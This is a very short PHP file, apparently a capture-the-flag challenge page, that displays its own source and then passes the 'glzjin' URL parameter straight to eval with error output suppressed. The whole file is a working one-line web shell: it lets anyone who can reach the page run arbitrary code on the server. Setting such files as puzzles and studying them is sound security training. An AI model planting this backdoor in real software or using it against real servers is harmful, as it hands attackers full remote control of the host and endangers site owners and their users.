<?php
highlight_file(__FILE__);
@eval($_GET['glzjin']);
